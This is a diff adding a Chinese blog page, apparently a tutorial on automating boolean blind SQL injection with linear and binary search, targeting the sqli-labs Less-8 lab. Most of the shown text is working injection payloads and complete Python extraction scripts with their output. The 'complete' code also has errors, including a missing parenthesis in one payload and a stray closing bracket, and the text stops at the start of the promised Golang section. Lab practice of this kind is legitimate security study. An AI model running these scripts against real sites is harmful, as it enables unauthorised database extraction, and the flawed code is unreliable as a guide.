@@ -1,0 +1,1334 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"><![endif]-->
+<!--[if IE 7]><html class="no-js lt-ie9 lt-ie8" <![endif]-->
+<!--[if IE 8]><html class="no-js lt-ie9" <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]--><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <title>SQL 布尔盲注自动化脚本二分查找实践与踩坑（Python, Golang, Rust）</title>
+
+    <!-- Open Graph Meta -->
+    <meta content="Go deep" property="og:site_name"><meta content="SQL 布尔盲注自动化脚本二分查找实践与踩坑（Python, Golang, Rust）" property="og:title"><meta content="article" property="og:type"><meta content="Go deep and be professional" property="og:description"><meta content="https://godeep.pro/blog/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE%E5%AE%9E%E8%B7%B5%E4%B8%8E%E8%B8%A9%E5%9D%91-Python-Golang-Rust/" property="og:url"><meta content="2021-05-25T00:00:00+00:00" property="article:published_time">
+      <meta content="https://godeep.pro/about/" property="article:author"><meta content="https://godeep.pro/assets/img/touring.jpg" property="og:image"><!-- Twitter Cards -->
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@brianmaierjr">
+    <meta name="twitter:creator" content="@brianmaierjr"><meta name="twitter:title" content="SQL 布尔盲注自动化脚本二分查找实践与踩坑（Python, Golang, Rust）"><meta name="twitter:url" content="https://godeep.pro/blog/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE%E5%AE%9E%E8%B7%B5%E4%B8%8E%E8%B8%A9%E5%9D%91-Python-Golang-Rust/"><meta name="twitter:description" content="Go deep and be professional"><meta name="twitter:image:src" content="https://godeep.pro/assets/img/touring.jpg"><!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="/assets/img/favicon.ico" />
+
+    <!-- Come and get me RSS readers -->
+    <link rel="alternate" type="application/rss+xml" title="Go deep" href="https://godeep.pro/feed.xml" />
+    
+    <!-- Stylesheet -->
+    <link rel="stylesheet" href="/assets/css/style.css">
+    <link rel="stylesheet" href="/assets/css/mo.css">
+    <!--[if IE 8]><link rel="stylesheet" href="/assets/css/ie.css"><![endif]-->
+    <link rel="canonical" href="https://godeep.pro/blog/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE%E5%AE%9E%E8%B7%B5%E4%B8%8E%E8%B8%A9%E5%9D%91-Python-Golang-Rust/">
+
+    <!-- Modernizr -->
+    <script src="/assets/js/modernizr.custom.15390.js"" type="text/javascript"></script><!-- Google Analytics: change UA-XXXXX-X to be your site's ID. -->
+<script>
+   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-G-ZRGHXLDL9E', 'auto');
+ga('send', 'pageview');
+
+</script>
+</head>
+<body> <div class="header ">
+     <div class="container">
+         <h1 class="logo"><a href="/">Go deep</a></h1>
+         <nav class="nav-collapse">
+             <ul class="noList"><li class="elementfirst">
+                     <a href="/index.html">Home</a>
+                 </li><li class="element">
+                     <a href="/articles">Articles (English)</a>
+                 </li><li class="element">
+                     <a href="/articles-zh">Articles (中文)</a>
+                 </li><li class="element">
+                     <a href="/articles-jp">Articles (日本語)</a>
+                 </li><li class="element">
+                     <a href="/categories">Categories</a>
+                 </li><li class="element">
+                     <a href="/contact">Contact</a>
+                 </li><li class="elementlast">
+                     <a href="/about">About</a>
+                 </li><li> <a href="https://github.com/gabirel" target="_blank">GitHub</a></li>
+             </ul>
+         </nav>
+     </div>
+ </div><!-- end .header -->
+<div class="content">
+      <div class="container">
+         <article class="post"><header>
+    <h1 class="postTitle">SQL 布尔盲注自动化脚本二分查找实践与踩坑（Python, Golang, Rust）</h1>
+    
+    <p class="meta">May 25, 2021 | <span class="time">54</span> Minutes Read</p>
+    
+  </header>
+
+  <p class="intro"><span class="dropcap">S</span>QL 盲注类型可以通过 sqlmap 简单地完成，亦可自己写一个简单的盲注脚本。现有的盲注脚本代码与文章质量良莠不齐，且大部分用的是线性搜索，效率奇低。</p>
+
+<p>故本文实践一下二分查找算法的盲注脚本，与此同时记录一下在这个过程中所遇到的坑点。（尤其是 Golang 实践中的坑）</p>
+
+<p>为以后各语言的注入脚本提供一个基于二分查找的可实践版本的代码。</p>
+
+<hr />
+<p>Table of Contents</p>
+
+<ul id="markdown-toc">
+  <li><a href="#测试环境安装" id="markdown-toc-测试环境安装">测试环境安装</a></li>
+  <li><a href="#sql-盲注脚本编写" id="markdown-toc-sql-盲注脚本编写">SQL 盲注脚本编写</a>    <ul>
+      <li><a href="#python-版" id="markdown-toc-python-版">Python 版</a>        <ul>
+          <li><a href="#坑点-1不使用-params-的方式完成-url-拼接" id="markdown-toc-坑点-1不使用-params-的方式完成-url-拼接">坑点 1：不使用 params 的方式完成 URL 拼接</a></li>
+          <li><a href="#线性搜索与二分查找算法实现" id="markdown-toc-线性搜索与二分查找算法实现">线性搜索与二分查找算法实现</a></li>
+          <li><a href="#找出完整信息" id="markdown-toc-找出完整信息">找出完整信息</a></li>
+          <li><a href="#完整的代码" id="markdown-toc-完整的代码">完整的代码</a></li>
+        </ul>
+      </li>
+      <li><a href="#golang-版" id="markdown-toc-golang-版">Golang 版</a>        <ul>
+          <li><a href="#坑点-2未编码-url" id="markdown-toc-坑点-2未编码-url">坑点 2：未编码 URL</a></li>
+          <li><a href="#排查错误与修复" id="markdown-toc-排查错误与修复">排查错误与修复</a></li>
+          <li><a href="#完整的代码-1" id="markdown-toc-完整的代码-1">完整的代码</a></li>
+          <li><a href="#其他想法与测试" id="markdown-toc-其他想法与测试">其他想法与测试</a></li>
+        </ul>
+      </li>
+      <li><a href="#rust-版" id="markdown-toc-rust-版">Rust 版</a>        <ul>
+          <li><a href="#坑点-3rust-中坑点" id="markdown-toc-坑点-3rust-中坑点">坑点 3：Rust 中坑点</a></li>
+          <li><a href="#简单的非异步-reqwest-示例" id="markdown-toc-简单的非异步-reqwest-示例">简单的非异步 reqwest 示例</a></li>
+          <li><a href="#完整的代码-2" id="markdown-toc-完整的代码-2">完整的代码</a></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><a href="#实践" id="markdown-toc-实践">实践</a></li>
+  <li><a href="#总结" id="markdown-toc-总结">总结</a></li>
+</ul>
+
+<hr />
+
+<hr />
+
+<h1 id="测试环境安装">测试环境安装</h1>
+
+<p>本文主要使用两个环境。一个是 <a href="https://hub.docker.com/r/acgpiano/sqli-labs">docker 版的 sqli-labs</a>，另一个是 CTFHub 的 SQL 布尔盲注（在线版）。</p>
+
+<p>安装并运行的 sqli-labs 命令如下：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">--rm</span> <span class="nt">-d</span> <span class="nt">-p</span> 80:80 acgpiano/sqli-labs
+</code></pre></div></div>
+
+<p>两个 URL 分别为如下：</p>
+
+<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">-</span> http://192.168.3.104/Less-8/?id=1
+<span class="p">-</span> http://challenge-8542e4f21d675576.sandbox.ctfhub.com:10080/
+</code></pre></div></div>
+
+<h1 id="sql-盲注脚本编写">SQL 盲注脚本编写</h1>
+
+<p>现有盲注脚本主要分为线性搜索和二分查找算法。目前可以通过搜索引擎简单搜索到到均是线性搜索，且代码普遍质量达不到我个人认可的程度。</p>
+
+<p>代码中有用的注释也比较少，可能大家写脚本的都不是专业的。因此本文提供 Python、Golang 和 Rust 版本的线性与二分查找算法的代码。</p>
+
+<p>希望本文可以为高效率盲注提供一个具体的实践方案。</p>
+
+<p>本节使用 sqli-labs 的 Less-8 来示范这个编写过程所遇到的问题。</p>
+
+<p><strong>前提：</strong> 本文中 Less-8 可用的 payload 为：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 未被编码过</span>
+http://192.168.3.104/Less-8/?id<span class="o">=</span>1<span class="s1">' and ascii(substr(database(),1,1))=115 --+
+# 编码过亦可成功
+http://192.168.3.104/Less-8/?id=1%27%20and%20ascii(substr(database(),1,1))=115 --+
+# 编码过但是无法成功，因为关键的最后一个`+`被编码了
+http://192.168.3.104/Less-8/?id=1%27%20and%20ascii(substr(database(),1,1))=115 --%2B
+</span></code></pre></div></div>
+
+<h2 id="python-版">Python 版</h2>
+
+<p>在盲注脚本中 python 库使用的是 <a href="https://docs.python-requests.org/">requests</a>。</p>
+
+<h3 id="坑点-1不使用-params-的方式完成-url-拼接">坑点 1：不使用 params 的方式完成 URL 拼接</h3>
+
+<p><strong>坑点 1：</strong> 在 Python 中，只能通过 URL 拼接的方式来完成 URL 的构造。
+<strong>不能用 <a href="https://docs.python-requests.org/en/latest/user/quickstart/#passing-parameters-in-urls">params 的方式</a>来完成拼接。</strong></p>
+
+<p>比如举个例子：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">base_url</span> <span class="o">=</span> <span class="s">"http://192.168.3.104/Less-8/"</span>
+    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">'id'</span><span class="p">:</span> <span class="s">"1' and ascii(substr(database(),1,1))=115 --+"</span><span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"?id=1' and ascii(substr(database(),1,1))=115 --+"</span>
+    <span class="n">r2</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">r2</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>此时输出为：</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 这个是无效的payload，因此不能通过params的方式拼接</span>
+http://192.168.3.104/Less-8/?id<span class="o">=</span>1%27+and+ascii%28substr%28database%28%29%2C1%2C1%29%29%3D115+--%2B
+<span class="c"># 拼接后是原始有效的</span>
+http://192.168.3.104/Less-8/?id<span class="o">=</span>1<span class="s1">'%20and%20ascii(substr(database(),1,1))=115%20--+
+</span></code></pre></div></div>
+
+<h3 id="线性搜索与二分查找算法实现">线性搜索与二分查找算法实现</h3>
+
+<p>先考虑最简单的情况，只去“猜”一个字符。</p>
+
+<ol>
+  <li>常规的线性搜索过程如下：</li>
+</ol>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 可显的ASCII字符为：32(&lt;空格&gt;)~126(~)
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1' and ascii(substr(database(),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))=</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> --+"</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="n">db_name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'database:'</span><span class="p">,</span> <span class="n">db_name</span><span class="p">)</span>
+        <span class="c1"># 注：使用break来提前退出
+</span>        <span class="k">break</span>
+</code></pre></div></div>
+
+<ol>
+  <li>二分算法实现查找过程：</li>
+</ol>
+
+<p>原理如下：与传统的二分算法不同在于，是否能够找得到对 SQL 盲注来说是一件非常重要的事情。</p>
+
+<p>网络上有的作者写的是不能判断，因此程序或有 bug。</p>
+
+<p>其实没有必要，只需利用二分查找过程中的“相等匹配”即可“立刻”判断出是否找到。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="n">high</span> <span class="o">=</span> <span class="mi">126</span>
+<span class="k">while</span> <span class="n">high</span> <span class="o">&gt;=</span> <span class="n">low</span><span class="p">:</span>
+    <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>  <span class="c1"># 取整
+</span>
+    <span class="c1"># 第一次判断是否相等
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1' and ascii(substr(database(),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))=</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s"> --+"</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="n">db_name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'database:'</span><span class="p">,</span> <span class="n">db_name</span><span class="p">)</span>
+        <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="k">break</span>
+    <span class="k">pass</span>
+
+    <span class="c1"># 再判断范围，然后缩小范围
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1' and ascii(substr(database(),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s"> --+"</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">-</span> <span class="mi">1</span>
+    <span class="k">pass</span>
+</code></pre></div></div>
+
+<h3 id="找出完整信息">找出完整信息</h3>
+
+<p>在上述的基础之上，怎么知道当前的字符是否判断完整？</p>
+
+<p>针对于这个问题，有网友提出解决办法是在“猜”字符 ASCII 码前，先用 <code class="language-plaintext highlighter-rouge">length()</code>“猜”出长度即可控制程序循环逻辑。</p>
+
+<p>但这无异于增加程序逻辑复杂性。解决办法其实比较简单，用两层循环即可完成该目标。</p>
+
+<p>线性搜索如下：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">j</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="k">while</span> <span class="ow">not</span> <span class="n">exit_flag</span><span class="p">:</span>
+    <span class="c1"># 总是假设该轮循环会退出
+</span>    <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1' and ascii(substr(database(),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))=</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> --+"</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">db_name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">'database:'</span><span class="p">,</span> <span class="n">db_name</span><span class="p">)</span>
+            <span class="c1"># 已找到一个字符，说明下一轮「可能」还会有字符，因此不能退出
+</span>            <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+            <span class="k">break</span>
+        <span class="k">pass</span>
+    <span class="n">j</span> <span class="o">+=</span> <span class="mi">1</span>
+<span class="k">return</span> <span class="n">db_name</span>
+</code></pre></div></div>
+
+<p>二分查找如下：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">j</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="k">while</span> <span class="ow">not</span> <span class="n">exit_flag</span><span class="p">:</span>
+    <span class="c1"># 总是假设该轮循环会退出
+</span>    <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
+    <span class="n">high</span> <span class="o">=</span> <span class="mi">126</span>
+    <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;=</span> <span class="n">low</span><span class="p">:</span>
+        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1' and ascii(substr(database(),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))=</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s"> --+"</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">db_name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">'database:'</span><span class="p">,</span> <span class="n">db_name</span><span class="p">)</span>
+            <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+            <span class="k">break</span>
+        <span class="k">pass</span>
+
+        <span class="c1"># another test for narrow down left or right range to search
+</span>        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1' and ascii(substr(database(),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s"> --+"</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">-</span> <span class="mi">1</span>
+        <span class="k">pass</span>
+    <span class="n">j</span> <span class="o">+=</span> <span class="mi">1</span>
+</code></pre></div></div>
+
+<h3 id="完整的代码">完整的代码</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="c1"># base_url = "ttp://192.168.3.104/Less-8/?id=1' and ascii(substr(database(),1,1))=115 --+"
+</span><span class="n">base_url</span> <span class="o">=</span> <span class="s">"http://192.168.3.104/Less-8/?id="</span>
+
+<span class="n">mark</span> <span class="o">=</span> <span class="s">'You are in'</span>
+
+
+<span class="c1"># more detail: https://stackoverflow.com/a/803626/8587335
+</span><span class="k">def</span> <span class="nf">measure_time</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
+    <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>
+    <span class="n">_</span> <span class="o">=</span> <span class="n">func</span><span class="p">()</span>
+    <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"Time: {} seconds"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">end_time</span> <span class="o">-</span> <span class="n">start_time</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">probe_database_linear</span><span class="p">():</span>
+    <span class="n">db_name</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="c1"># params = {'id': "1' and ascii(substr(database(),1,1))=115 --+"}
+</span>
+    <span class="c1"># all visible character is: 32( )-&gt;126(~)
+</span>    <span class="n">j</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">while</span> <span class="ow">not</span> <span class="n">exit_flag</span><span class="p">:</span>
+        <span class="c1"># always assume we will exit in this loop
+</span>        <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1' and ascii(substr(database(),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))=</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> --+"</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="n">db_name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">'database:'</span><span class="p">,</span> <span class="n">db_name</span><span class="p">)</span>
+                <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+                <span class="k">break</span>
+            <span class="k">pass</span>
+        <span class="n">j</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="n">db_name</span>
+
+
+<span class="k">def</span> <span class="nf">probe_database_binary</span><span class="p">():</span>
+    <span class="n">db_name</span> <span class="o">=</span> <span class="s">''</span>
+    <span class="c1"># params = {'id': "1' and ascii(substr(database(),1,1))=115 --+"}
+</span>
+    <span class="c1"># all visible character is: 32( )-&gt;126(~)
+</span>    <span class="n">j</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">while</span> <span class="ow">not</span> <span class="n">exit_flag</span><span class="p">:</span>
+        <span class="c1"># always assume we will exit in this loop
+</span>        <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
+        <span class="n">high</span> <span class="o">=</span> <span class="mi">126</span>
+        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;=</span> <span class="n">low</span><span class="p">:</span>
+            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1' and ascii(substr(database(),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">)=</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s"> --+"</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="n">db_name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">'database:'</span><span class="p">,</span> <span class="n">db_name</span><span class="p">)</span>
+                <span class="n">exit_flag</span> <span class="o">=</span> <span class="bp">False</span>
+                <span class="k">break</span>
+            <span class="k">pass</span>
+
+            <span class="c1"># another test for narrow down left or right range to search
+</span>            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1' and ascii(substr(database(),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">,</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s">))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s"> --+"</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">mark</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">-</span> <span class="mi">1</span>
+            <span class="k">pass</span>
+        <span class="n">j</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="n">db_name</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"linear:"</span><span class="p">)</span>
+    <span class="n">measure_time</span><span class="p">(</span><span class="k">lambda</span><span class="p">:</span> <span class="n">probe_database_linear</span><span class="p">())</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">binary:"</span><span class="p">)</span>
+    <span class="n">measure_time</span><span class="p">(</span><span class="k">lambda</span><span class="p">:</span> <span class="n">probe_database_binary</span><span class="p">())</span>
+<span class="p">)</span>
+</code></pre></div></div>
+
+<p>看一下输出的结果与时间对比：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>linear:
+database: s
+database: se
+database: sec
+database: secu
+database: secur
+database: securi
+database: securit
+database: security
+Time: 11.133447170257568 seconds
+
+binary:
+database: s
+database: se
+database: sec
+database: secu
+database: secur
+database: securi
+database: securit
+database: security
+Time: 0.7845282554626465 seconds
+</code></pre></div></div>
+
+<p>可见二分查找的效率是有多么地显著。珍爱生命，还是尽可能有二分这种查找算法吧。写起来也并不复杂。</p>
+
+<h2 id="golang-版">Golang 版</h2>
+
+<p>Golang 版没有比较成熟与好用的库类似于 Python 的 requests，但是有一个类似的库叫：<a href="https://github.com/levigross/grequests">grequests</a>。</p>
+
